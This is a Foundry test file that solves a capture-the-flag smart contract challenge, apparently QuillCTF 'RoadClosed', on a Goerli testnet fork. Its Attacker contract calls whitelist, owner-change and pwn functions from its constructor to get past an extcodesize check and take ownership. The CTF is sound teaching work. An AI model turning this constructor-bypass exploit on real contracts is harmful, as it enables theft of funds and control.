// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/// ./challenge/RoadClosed.sol

/// Define the interface for the Target contract
interface ITarget {
    function addToWhitelist(address addr) external;

    function changeOwner(address addr) external;

    function pwn(address addr) external payable;

    function pwn() external payable;

    function isHacked() external view returns (bool);

    function isOwner() external view returns (bool);
}

/// Define the attacker contract
contract Attacker {
    /// Calling the functions from a contract's constructor will bypasses the `extcodesize > 0` check
    constructor(address target) {
        ITarget(target).addToWhitelist(address(this));
        ITarget(target).changeOwner(address(this));
        ITarget(target).pwn(address(this));
    }
}

contract QuillCTF1Solved is Test {
    ITarget _target = ITarget(0xD2372EB76C559586bE0745914e9538C17878E812);
    Attacker _attacker;

    /// Run the test against the goerli testnet fork
    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/eth_goerli");
        _attacker = new Attacker(address(_target));
    }

    /// Exploit! Validate if owner == attacker's address
    function testExploit() external {
        assertEq(_target.isHacked(), true);
        vm.prank(address(_attacker));
        assertEq(_target.isOwner(), true);
    }
}
